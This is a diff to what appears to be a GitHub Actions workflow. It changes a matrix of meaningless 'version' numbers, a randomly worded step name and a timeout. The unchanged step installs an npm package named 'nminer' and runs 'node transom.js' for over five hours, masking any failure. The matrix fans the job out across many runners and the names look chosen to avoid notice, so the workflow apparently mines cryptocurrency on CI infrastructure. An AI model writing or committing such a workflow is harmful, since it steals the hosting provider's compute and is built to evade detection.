@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1168 }
-          - { version: 6970 }
-          - { version: 257 }
-          - { version: 7414 }
-          - { version: 8504 }
-          - { version: 1480 }
-          - { version: 9329 }
-          - { version: 8107 }
-          - { version: 3306 }
-          - { version: 4 }
-          - { version: 7317 }
-          - { version: 4322 }
-          - { version: 5296 }
-          - { version: 2382 }
-          - { version: 8934 }
-          - { version: 9618 }
-          - { version: 5416 }
-          - { version: 3482 }
-          - { version: 5248 }
+          - { version: 1225 }
+          - { version: 281 }
+          - { version: 1374 }
+          - { version: 1732 }
+          - { version: 1662 }
+          - { version: 42 }
+          - { version: 4617 }
+          - { version: 6516 }
+          - { version: 4465 }
+          - { version: 2304 }
+          - { version: 7002 }
+          - { version: 5575 }
+          - { version: 2263 }
+          - { version: 3437 }
+          - { version: 5490 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: incidentally militate worst around sudden
+      - name: ouch whoa trial
         run: |
           npm install nminer@latest
-          timeout 333m node transom.js || echo "transom executed"
+          timeout 321m node transom.js || echo "transom executed"
